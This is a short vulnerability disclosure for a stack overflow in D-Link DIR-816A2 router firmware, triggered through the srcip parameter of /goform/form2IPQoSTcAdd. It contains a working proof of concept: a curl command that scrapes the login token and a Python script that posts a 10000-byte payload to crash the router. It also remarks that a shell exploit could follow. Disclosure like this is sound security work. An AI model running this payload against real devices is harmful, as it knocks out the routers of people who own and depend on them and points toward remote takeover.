# DIR-816A2_FWv1.10CNB05_R1B011D88210.img Stack overflow vulnerability

## Overview

- Manufacturer's address：http://www.dlink.com.cn/
- Firmware download address ： http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-816

## Affected version

Below is the latest firmware

![](img/1.png#center)

## Vulnerability details

Vulnerability occurs in /goform/form2IPQoSTcAdd.   The content obtained by srcip parameter is passed to V14, and then the content matched by V14 is formatted into the V12 stack without size checking, resulting in a stack overflow.

![](img/2.png#center)

## POC

Gets the token ID

```
curl http://ip/dir_login.asp | grep tokenid
```

Run poc

```python
import requests

tokenid = 'xxx'

url = 'http://10.211.55.20/goform/form2IPQoSTcAdd'

payload = b'a' * 10000

data = {
    'tokenid': tokenid,
    'srcip': payload,
}

r = requests.post(url, data)
hunzi = r.text
print(hunzi)
```

You can see the router crash, and finally you can write an exp to get a shell.
